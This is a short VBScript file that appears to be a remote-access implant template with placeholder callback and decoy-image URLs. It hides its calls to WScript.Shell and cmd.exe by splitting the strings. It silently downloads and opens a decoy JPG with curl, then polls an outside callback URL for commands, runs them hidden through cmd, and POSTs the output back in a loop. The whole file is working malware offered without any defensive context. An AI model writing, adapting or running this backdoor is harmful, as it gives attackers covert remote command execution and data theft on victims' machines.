On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmpFolder 
tmpFolder = fso.GetSpecialFolder(2)
CONST callbackUrl = "%CALLBACK_URL%"

Set oS = CreateObject ("WSc" & "ript." & "Sh" & "ell")
oS.run "c" & "md.e" & "xe /C curl ""%JPG_URL%"" -o " & tmpFolder & "\\%JPG_OUTPUT_NAME% & start "" "" " & tmpFolder & "\%JPG_OUTPUT_NAME% & timeout 3", 0, True
Dim xmlHttpReq, s, abc, break, re

break = False
While break <> True
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false
	xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000
    xmlHttpReq.Send

    abc = "c" & "m" & "d /c " & Trim(xmlHttpReq.responseText) & " > " &  tmpFolder & "\\o.txt"

    Dim dteWait
    dteWait = DateAdd("s", 1, Now())
    Do Until (Now() > dteWait)
    Loop

    If InStr(abc, "EXIT") Then
        break = True
    Else
        oS.run abc,0,True
		
		re = ""
		
		With CreateObject("Scripting.FileSystemObject")
			
			re = .OpenTextFile(tmpFolder & "\\o.txt").ReadAll()
			.DeleteFile tmpFolder & "\\o.txt"

		End With

        Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false
		xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000
        xmlHttpReq.Send(re)
    End If
Wend